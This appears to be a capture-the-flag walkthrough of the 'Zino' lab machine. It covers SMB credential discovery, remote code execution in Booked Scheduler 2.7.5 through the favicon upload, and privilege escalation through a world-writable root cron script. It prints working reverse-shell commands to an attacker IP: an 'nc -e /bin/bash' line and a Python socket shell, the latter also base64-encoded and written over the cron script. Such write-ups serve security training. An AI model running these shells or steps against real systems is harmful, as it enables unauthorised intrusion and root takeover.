# Zino

### Enumeration

```
...
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
8003/tcp open  http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
...
```

```
$ smbmap -H 192.168.210.64
$ smbclient \\\\192.168.210.64\\zino
misc.log -> admin:[REDACTED]
```

### Initial Access

Login with that credential. -> [http://192.168.210.64:8003/booked/](http://192.168.210.64:8003/booked/)

admin: \[REDACTED]

**Booked Scheduler 2.7.5 - Remote Command Execution Without Metasploit -**&#x20;

https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF

> Navigate to manage\_theme.php page.
>
> Under Favicon section, upload your malicious php script e.g. I am uploading a file rce.php.
>
> Navigate to http://192.168.210.64:8003/booked/Web/custom-favicon.php

[https://www.revshells.com/](https://www.revshells.com) - PHP Cmd

I used php cmd shell. I executed this command:

```
nc -e /bin/bash 192.168.49.210 22
```

### PrivEsc

```
$ cat /etc/crontab
...
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py

-rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
```

**Base64 Encoded:** `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.210",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")`

```
echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDkuMjEwIiwyMikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIp | base64 -d > /var/www/html/booked/cleanup.py
```
